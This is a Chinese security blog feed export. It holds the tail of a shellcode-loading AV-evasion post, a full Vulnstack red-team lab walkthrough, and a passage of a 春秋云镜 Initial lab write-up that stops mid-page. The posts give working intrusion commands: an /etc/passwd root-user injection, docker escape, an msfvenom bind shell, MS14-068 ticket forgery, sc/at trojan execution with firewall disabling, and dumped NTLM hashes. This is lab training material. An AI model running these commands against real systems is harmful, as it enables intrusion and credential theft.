将有效载荷从资源部分移动到临时缓冲区</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">// 使用 HeapAlloc 调用分配内存</span>PVOID pTmpBuffer <span class="token operator">=</span> <span class="token function">HeapAlloc</span><span class="token punctuation">(</span><span class="token function">GetProcessHeap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> sPayloadSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>pTmpBuffer <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">// 将有效载荷从资源部分复制到新的缓冲区</span><span class="token function">memcpy</span><span class="token punctuation">(</span>pTmpBuffer<span class="token punctuation">,</span> pPayloadAddress<span class="token punctuation">,</span> sPayloadSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 打印缓冲区的基地址 (pTmpBuffer)</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[i] pTmpBuffer 变量: 0x%p \n"</span><span class="token punctuation">,</span> pTmpBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>由于现在 <code>pTmpBuffer</code> 指向一个可写的内存区域，并且该区域保存了有效载荷，因此可以对有效载荷进行解密或执行任何更新操作。</p><p>下面的图片显示了存储在资源部分的 Msfvenom shellcode：<br><img src="/Rxi134_FILE/40966272953f986b6f63a9c174a6a1fe_MD5.jpeg"></p><p>继续执行时，有效负载将保存在临时缓冲区中。<br><img src="/Rxi134_FILE/f0569689ebe78e06c268af3aa360db2c_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AV </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK红队评估实战靶场-4</title>
      <link href="/2024/11/16/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-4/"/>
      <url>/2024/11/16/ATT&amp;CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA-4/</url>
      
        <content type="html"><![CDATA[<blockquote><p>下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">漏洞详情</a></p></blockquote><p><img src="/Rxi134_FILE/01e760a174b100ab764f690ba82aaa18_MD5.jpeg"></p><h1 id="网络搭建"><a href="#网络搭建" class="headerlink" title="网络搭建"></a>网络搭建</h1><pre class="line-numbers language-text" data-language="text"><code class="language-text">ubuntu:ubuntu192.168.74.140192.168.183.128域成员机器douser:Dotest123192.168.183.129DCadministrator:Test2008192.168.183.130<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul><li><p>web机器</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/struts2/s2-045<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/<span class="token function">sudo</span> <span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>win7<br>win7总是挂起，修改设备计划<br><img src="/Rxi134_FILE/393f5041cfd50e06414cf2e793ebb750_MD5.jpeg"></p></li></ul><h1 id="边界"><a href="#边界" class="headerlink" title="边界"></a>边界</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>goby上去打些常见poc，随便把端口扫了<br><img src="/Rxi134_FILE/3243933a3096253353d76f94faab9aad_MD5.jpeg"></p><h2 id="tomcat-PUT-任意文件上传（CVE-2017-12615）"><a href="#tomcat-PUT-任意文件上传（CVE-2017-12615）" class="headerlink" title="tomcat PUT 任意文件上传（CVE-2017-12615）"></a>tomcat PUT 任意文件上传（CVE-2017-12615）</h2><p>tomcat 远程代码执行<br><img src="/Rxi134_FILE/d2eb0872f91e3d5bd9d08ed7f81b9c4f_MD5.jpeg"></p><p>工具直接梭哈，上传webshell<br><img src="/Rxi134_FILE/f39cc38d710b6095f7052a0ee7c05174_MD5.jpeg"></p><p>拿到root<br><img src="/Rxi134_FILE/731948ac195fef247d2ebc37dfc1b985_MD5.jpeg"></p><p>看了ip傻眼了，172.18.0.2 ？</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">(root:/tmp) $ uname -aLinux 09dd4e5bfa91 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 GNU/Linux(root:/tmp) $ ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00    inet 127.0.0.1/8 scope host lo       valid_lft forever preferred_lft forever10: eth0@if11: &lt;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default     link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0    inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0       valid_lft forever preferred_lft forever<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>果真在docker环境里<br><img src="/Rxi134_FILE/a309f4c888102752232fb3451e5877dd_MD5.jpeg"></p><h2 id="docker逃逸（特权模式）"><a href="#docker逃逸（特权模式）" class="headerlink" title="docker逃逸（特权模式）"></a>docker逃逸（特权模式）</h2><p><img src="/Rxi134_FILE/6d4ca50e62f8d898a4113a5292a501cb_MD5.jpeg"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /test <span class="token function">mount</span> /dev/sda1 /test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>成功逃逸到宿主机，只有用户ubuntu和root<br><img src="/Rxi134_FILE/0b934d83681779a4e07c3145ed0907ff_MD5.jpeg"></p><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><h3 id="失败思路1-修改-etc-passwd直接root-ssh"><a href="#失败思路1-修改-etc-passwd直接root-ssh" class="headerlink" title="失败思路1. 修改&#x2F;etc&#x2F;passwd直接root ssh"></a>失败思路1. 修改&#x2F;etc&#x2F;passwd直接root ssh</h3><p>修改passwd</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"rxi134:\<span class="token variable">$1</span>\<span class="token variable">$rxi134</span>\<span class="token variable">$a</span>/DG862QDtnw0tapAC9vv0:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> ./etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但是无法ssh上去<br><img src="/Rxi134_FILE/100477502cab9435adb13719df71db50_MD5.jpeg"></p><p>查看sshd_config，原来是禁用了root ssh</p><h3 id="失败思路2-拿走私钥文件直接ssh"><a href="#失败思路2-拿走私钥文件直接ssh" class="headerlink" title="失败思路2. 拿走私钥文件直接ssh"></a>失败思路2. 拿走私钥文件直接ssh</h3><p>私钥文件有密码原语，解不开<br><img src="/Rxi134_FILE/6171339c219a84d2cb82acfad7ac5927_MD5.jpeg"></p><h3 id="成功思路3-创建普通用户，ssh上去再提升到root"><a href="#成功思路3-创建普通用户，ssh上去再提升到root" class="headerlink" title="成功思路3. 创建普通用户，ssh上去再提升到root"></a>成功思路3. 创建普通用户，ssh上去再提升到root</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">└─$ openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> hacker <span class="token number">123456</span><span class="token variable">$1</span><span class="token variable">$hacker</span><span class="token variable">$6luIRwdGpBvXdP</span>.GMwcZp/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-text" data-language="text"><code class="language-text">ubuntu:x:1000:1000:ubuntu,,,:/home/ubuntu:/bin/bashhacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:1000:1000:ubuntu:/home/ubuntu:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"hacker:\<span class="token variable">$1</span>\<span class="token variable">$hacker</span>\<span class="token variable">$6luIRwdGpBvXdP</span>.GMwcZp/:1000:1000:ubuntu:/home/ubuntu:/bin/bash"</span> <span class="token operator">>></span> ./etc/passwd<span class="token builtin class-name">echo</span> <span class="token string">"rxi134:\<span class="token variable">$1</span>\<span class="token variable">$rxi134</span>\<span class="token variable">$a</span>/DG862QDtnw0tapAC9vv0:0:0:root:/root:/bin/bash"</span> <span class="token operator">>></span> ./etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>su rxi134<br><img src="/Rxi134_FILE/930f8e22fd8868e1bbdce41aef1f9629_MD5.jpeg"></p><h3 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h3><p><img src="/Rxi134_FILE/6b35d8a0fc2be78c01770cdc0b92d82a_MD5.jpeg"></p><h2 id="搭建socks代理"><a href="#搭建socks代理" class="headerlink" title="搭建socks代理"></a>搭建socks代理</h2><p>喜欢用chisel<br><img src="/Rxi134_FILE/9b83bce5f65cf23056eebea5735c93c7_MD5.jpeg"></p><h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><h2 id="fscan大保健"><a href="#fscan大保健" class="headerlink" title="fscan大保健"></a>fscan大保健</h2><p>内网 ip 为 192.168.183.128，存在内网网段 192.168.183.0&#x2F;24<br><img src="/Rxi134_FILE/03c55c88c226fd1feab4204dac98fc63_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">start infoscan(icmp) Target 192.168.183.131 is alive(icmp) Target 192.168.183.130 is alive(icmp) Target 192.168.183.134 is alive[*] Icmp alive hosts len is: 3192.168.183.134:139 open192.168.183.134:135 open192.168.183.130:139 open192.168.183.130:135 open192.168.183.131:22 open192.168.183.130:88 open192.168.183.134:445 open192.168.183.130:445 open[*] alive ports len is: 8start vulscan[*] NetInfo [*]192.168.183.134   [->]TESTWIN7-PC   [->]192.168.183.134[*] NetInfo [*]192.168.183.130   [->]WIN-ENS2VR5TR3N   [->]192.168.183.130[+] MS17-010 192.168.183.130(Windows Server 2008 HPC Edition 7601 Service Pack 1)[*] NetBios 192.168.183.130 [+] DC:WIN-ENS2VR5TR3N.demo.com      Windows Server 2008 HPC Edition 7601 Service Pack 1[+] MS17-010 192.168.183.134(Windows 7 Enterprise 7601 Service Pack 1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="永恒之蓝拿下用户机"><a href="#永恒之蓝拿下用户机" class="headerlink" title="永恒之蓝拿下用户机"></a>永恒之蓝拿下用户机</h2><p>proxychains走代理，msf打永恒之蓝</p><p>我的wsl出了点问题，先用kali继续</p><ul><li><p>尝试：chisel搭建隧道，proxychains+msf<br>?<br><img src="/Rxi134_FILE/d89f18c8c860f96dfdd30b985838fdf9_MD5.jpeg"></p></li><li><p>尝试：chisel搭建隧道，setg+msf<br><img src="/Rxi134_FILE/fb10a599aa9ce08d65dbd1294cff88d2_MD5.jpeg"><br>nnd终于成功了，拿下 TESTWIN7-PC</p></li></ul><h2 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>systeminfo</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Host Name:                 TESTWIN7-PCOS Name:                   Microsoft Windows 7 企业版OS Version:                6.1.7601 Service Pack 1 Build 7601OS Manufacturer:           Microsoft CorporationOS Configuration:          Member WorkstationOS Build Type:             Multiprocessor FreeRegistered Owner:          testwin7Registered Organization:Product ID:                00392-918-5000002-85176      Original Install Date:     2019/12/31, 10:38:42System Boot Time:          2024/11/13, 17:27:48System Manufacturer:       VMware, Inc.System Model:              VMware Virtual PlatformSystem Type:               x64-based PCProcessor(s):              1 Processor(s) Installed.                           [01]: Intel64 Family 6 Model 183 Stepping 1 GenuineIntel ~2419 MhzBIOS Version:              Phoenix Technologies LTD 6.00, 2020/11/12Windows Directory:         C:\WindowsSystem Directory:          C:\Windows\system32Boot Device:               \Device\HarddiskVolume1System Locale:             zh-cn;Chinese (China)Input Locale:              zh-cn;Chinese (China)Time Zone:                 (UTC+08:00) Beijing, Chongqing, Hong Kong, Urumqi   Total Physical Memory:     2,047 MBAvailable Physical Memory: 1,483 MBVirtual Memory: Max Size:  4,095 MBVirtual Memory: Available: 3,415 MBVirtual Memory: In Use:    680 MBPage File Location(s):     C:\pagefile.sysDomain:                    demo.comLogon Server:              N/AHotfix(s):                 37 Hotfix(s) Installed.                           [01]: KB2491683                           [02]: KB2534111                           [03]: KB2564958                           [04]: KB2621440                           [05]: KB2653956                           [06]: KB2654428                           [07]: KB2698365                           [08]: KB2705219                           [09]: KB2736422                           [10]: KB2813430                           [11]: KB2900986                           [12]: KB2937610                           [13]: KB2943357                           [14]: KB2978120                           [15]: KB2984972                           [16]: KB2992611                           [17]: KB2999226                           [18]: KB3004375                           [19]: KB3010788                           [20]: KB3023215                           [21]: KB3031432                           [22]: KB3035126                           [23]: KB3037574                           [24]: KB3045685                           [25]: KB3046269                           [26]: KB3072305                           [27]: KB3074543                           [28]: KB3086255                           [29]: KB3097989                           [30]: KB3101722                           [31]: KB3108371                           [32]: KB3122648                           [33]: KB3127220                           [34]: KB3155178                           [35]: KB4019990                           [36]: KB4040980                           [37]: KB976902Network Card(s):           1 NIC(s) Installed.                           [01]: Intel(R) PRO/1000 MT Network Connection                                 Connection Name: 本地连接                                 DHCP Enabled:    Yes                                 DHCP Server:     192.168.183.254                                 IP address(es)                                 [01]: 192.168.183.163                                 [02]: fe80::4c2e:5407:57a4:6774<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>net user</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">net userUser accounts for \\-------------------------------------------------------------------------------Administrator            Guest                    testclone                The command completed with one or more errors.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h2><p><img src="/Rxi134_FILE/6389f0a064aef1e980bf82e49c8e0a7c_MD5.jpeg"><br>抓取到一个域用户</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">DEMO.COM\douser:Dotest123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启用远程桌面</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/ee749addb2577ec9d67e3c2cf2f68e94_MD5.jpeg"></p><p>psexec也不行，这个用户权限很低</p><h2 id="bloodhound"><a href="#bloodhound" class="headerlink" title="bloodhound"></a>bloodhound</h2><p>powershell和exe都执行不了<br><img src="/Rxi134_FILE/e2bf6b25542ad8d2f95f89e951443530_MD5.jpeg"><br><img src="/Rxi134_FILE/1c0c79ea710ccf955aa70a858c8485be_MD5.jpeg"></p><h2 id="进程注入"><a href="#进程注入" class="headerlink" title="进程注入"></a>进程注入</h2><p>可以注入 douser 进程<br><img src="/Rxi134_FILE/c8931aa921f9970f739345226ea4ed55_MD5.jpeg"></p><h2 id="上线CS-1"><a href="#上线CS-1" class="headerlink" title="上线CS"></a>上线CS</h2><p>利用socat转发端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">socat <span class="token parameter variable">-d</span> TCP4-LISTEN:80,fork TCP4:192.168.74.149:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/947ec3d4750c8e1317bbed6d7bb3283e_MD5.jpeg"></p><p>生成一个stagerless木马，反弹到 web机 的内网ip<br><img src="/Rxi134_FILE/86f39596d404cd86cbbac7bf1e8679b7_MD5.jpeg"></p><h2 id="ms14-068提升至域管"><a href="#ms14-068提升至域管" class="headerlink" title="ms14-068提升至域管"></a>ms14-068提升至域管</h2><p>demo\douser的SID：</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">PS&gt; whoami &#x2F;alldemo\douser S-1-5-21-979886063-1111900045-1414766810-1107<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>域名全称为</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">DEOM.COM<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成伪造的ccache票据</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">MS14-068.exe -u douser@demo.com -p Dotest123 -s S-1-5-21-979886063-1111900045-1414766810-1107 -d 192.168.183.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/8333a0c0d7a7ed970b5c42410804547e_MD5.jpeg"></p><p>445端口好像有问题（可能是永恒之蓝打坏了），ipc挂载不了</p><p>上传mimikatz和伪造的票据<br><img src="/Rxi134_FILE/14b2b4b286ee467d68f1e9619bb4db36_MD5.jpeg"></p><p>runas 移动到 demo.com\dousr 用户<br><img src="/Rxi134_FILE/d578b807b9be56dd55a96d62d70d22f0_MD5.jpeg"></p><p>导入票据到内存<br><img src="/Rxi134_FILE/48ec8dacc2be34ab01d0f38cc2419e94_MD5.jpeg"></p><p>芜湖<br><img src="/Rxi134_FILE/cb3088967ed54dcc07ebfba95ef5a243_MD5.jpeg"></p><h2 id="ipc-sc尝试拿下域控"><a href="#ipc-sc尝试拿下域控" class="headerlink" title="ipc+sc尝试拿下域控"></a>ipc+sc尝试拿下域控</h2><p>ipc搭配sc，顺便把防火墙关了</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">net use \\WIN-ENS2VR5TR3N\ipc$copy muma.exe \\WIN-ENS2VR5TR3N\c$dir \\WIN-ENS2VR5TR3N\c$ |findstr mumasc \\WIN-ENS2VR5TR3N create firewalldown binpath&#x3D; &quot;netsh advfirewall set allprofiles state off&quot; start&#x3D; auto sc \\WIN-ENS2VR5TR3N create muma binpath&#x3D; &quot;c:\muma.exe&quot; start&#x3D; autosc start firewalldownsc start muma<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是cobaltstrike上线一会就断掉了，不明所以，登上桌面看看<br><img src="/Rxi134_FILE/3cb6c9fbaf1bcec7836d88df0226c512_MD5.jpeg"><br>🤔</p><h2 id="ipc-at拿下域控"><a href="#ipc-at拿下域控" class="headerlink" title="ipc+at拿下域控"></a>ipc+at拿下域控</h2><p>创建计划任务来执行木马</p><pre class="line-numbers language-cmd" data-language="cmd"><code class="language-cmd">C:\&gt;net time \\WIN-ENS2VR5TR3N\\WIN-ENS2VR5TR3N 的当前时间是 2024&#x2F;11&#x2F;16 20:55:10C:\&gt;at \\WIN-ENS2VR5TR3N 20:55:30 C:\ma2.exe新加了一项作业，其作业 ID &#x3D; 2C:\&gt;at \\WIN-ENS2VR5TR3N状态 ID     日期                    时间          命令行-------------------------------------------------------------------        1   明天                    20:51         C:\ma2.exe        2   今天                    20:55         C:\ma2.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>爽了<br><img src="/Rxi134_FILE/8dd49eb4052f992ac0674c44efaa3806_MD5.jpeg"></p><p>hashdump抓取krbtgt hash</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">Administrator:500:aad3b435b51404eeaad3b435b51404ee:97dab5a8641ed01e064a6c3957980405:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c4ed692473d4b4344c3ba01c5e6cb63:::douser:1103:aad3b435b51404eeaad3b435b51404ee:bc23b0b4d5bf5ff42bc61fb62e13886e:::WIN-ENS2VR5TR3N$:1000:aad3b435b51404eeaad3b435b51404ee:61562eb872832ff0d87e1c7ab6daeac2:::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>mimikatz抓取到明文密码（因为密码过期，所以我事先改掉了），<code>DEMO.COM\administrator:Test20088</code><br><img src="/Rxi134_FILE/08d1f8b77d203a94687218320330daa3_MD5.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> pentest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vulnstack靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>春秋云镜-Initial</title>
      <link href="/2024/10/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/"/>
      <url>/2024/10/15/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。</p></blockquote><ul><li>DCSync</li><li>CVE</li><li>域渗透<br><img src="/Rxi134_FILE/58142e8af4ac2508452353c3efc22aee_MD5.jpeg"></li></ul><h1 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h1><h1 id="web机器-thinkphp"><a href="#web机器-thinkphp" class="headerlink" title="web机器 thinkphp"></a>web机器 thinkphp</h1><p>先访问80端口</p><p>这图标，一眼thinkphp<br><img src="/Rxi134_FILE/5e7826534b99fb53ddd61360c2a3a6d4_MD5.jpeg"></p><p>制造报错测试下版本，5.0.23<br><img src="/Rxi134_FILE/00dff5ba3574fba90599582655f09181_MD5.jpeg"></p><p><img src="/Rxi134_FILE/780ce7e44c999bac5d117f4c23cede90_MD5.jpeg"></p><p>命令执行无回显，简单上个 webshell 算了<br><img src="/Rxi134_FILE/f3dfea2fae5cf0ca1abd0d8dfe30fad4_MD5.jpeg"><br><img src="/Rxi134_FILE/db37dff6f2590695f6ab6e1a2eb6ecf7_MD5.jpeg"></p><h1 id="上线msf"><a href="#上线msf" class="headerlink" title="上线msf"></a>上线msf</h1><p>就不用vps了，生成木马正连拿shell</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-a</span> x64 <span class="token parameter variable">--platform</span> Linux <span class="token parameter variable">-p</span> linux/x64/meterpreter/bind_tcp <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">1314</span> <span class="token parameter variable">-f</span> elf <span class="token parameter variable">-o</span> ma.elf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/3573133e86af79eea1f554587fee6631_MD5.jpeg"></p><p>web机安装了python3，起一个伪终端好看些</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-c</span> <span class="token string">"import pty;pty.spawn('/bin/bash')"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/Rxi134_FILE/a25cbcb0339ff03fd89542d24750705c_MD5.jpeg"></p><p>但是我没找到flag，可能要提权之类的叭<br><img src="/Rxi134_FILE/03dd59110e803af6aebaa8326e8b9ac3_MD5.jpeg"></p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>linpeas先搜集一波<br><img src="/Rxi134_FILE/a032bd1f9d1a0bd6321be5b68870fc12_MD5.jpeg"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> mysql <span class="token parameter variable">-e</span> <span class="token string">'\! /bin/bash'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="获取flag1"><a href="#获取flag1" class="headerlink" title="获取flag1"></a>获取flag1</h2><p><img src="/Rxi134_FILE/62f6f43f91f8060c23aba72a4cff2be2_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">flag&#123;60b53231-<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同时上线msf<br><img src="/Rxi134_FILE/d0a08cdc13a78ecea6f64d241c7a7d95_MD5.jpeg"></p><h1 id="fscan内网大保健"><a href="#fscan内网大保健" class="headerlink" title="fscan内网大保健"></a>fscan内网大保健</h1><p>看下内网网段，172.22.1.0&#x2F;24<br><img src="/Rxi134_FILE/e6204f90bf4c56e834ea7608176988ee_MD5.jpeg"></p><p>传个fscan，一键日内网<br><img src="/Rxi134_FILE/6135163d1bc1d91b05add6e361da8c0f_MD5.jpeg"></p><pre class="line-numbers language-text" data-language="text"><code class="language-text">start infoscantrying RunIcmp2The current user permissions unable to send icmp packetsstart ping(icmp) Target 172.22.1.2      is alive(icmp) Target 172.22.1.15     is alive(icmp) Target 172.22.1.21     is alive(icmp) Target 172.22.1.18     is alive[*] Icmp alive hosts len is: 4172.22.1.21:135 open172.22.1.2:135 open172.22.1.18:139 open172.22.1.21:139 open172.22.1.2:139 open172.22.1.18:135 open172.22.1.18:3306 open172.22.1.18:445 open172.22.1.21:445 open172.22.1.2:445 open172.22.1.18:80 open172.22.1.15:80 open172.22.1.15:22 open172.22.1.2:88 open[*] alive ports len is: 14start vulscan[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin[*] NetInfo [*]172.22.1.18   [->]XIAORANG-OA01   [->]172.22.1.18[*] NetInfo [*]172.22.1.2   [->]DC01   [->]172.22.1.2[*] NetInfo [*]172.22.1.21   [->]XIAORANG-WIN7   [->]172.22.1.21[+] MS17-010 172.22.1.21(Windows Server 2008 R2 Enterprise 7601 Service Pack 1)[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393[*] OsInfo 172.22.1.2(Windows Server 2016 Datacenter 14393)[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1已完成 14/14[*] 扫描结束,耗时: 11.06878218s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>总结下来内网有4台机子</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">172.22.1.2 dc172.22.1.15 我172.22.1.21 win2008，可能受到ms17-010的影响172.22.1.18 信呼oa<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="搭建socks代理"><a href="#搭建socks代理" class="headerlink" title="搭建socks代理"></a>搭建socks代理</h1><p>上传个ew作为内网代理，方便访问oa</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> ssocksd <span class="token parameter variable">-l</span> <span class="token number">20000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以正常连接<br><img src="/Rxi134_FILE/93a16a7df364219e72aa7c8660dec2cc_MD5.jpeg"></p><h1 id="添加session路由"><a href="#添加session路由" class="headerlink" title="添加session路由"></a>添加session路由</h1><p>方便把我们的msf流量带入内网</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">run autoroute <span class="token parameter variable">-s</span> <span class="token number">172.22</span>.1.0/24run autoroute <span class="token parameter variable">-p</span><span aria-hidden="true" 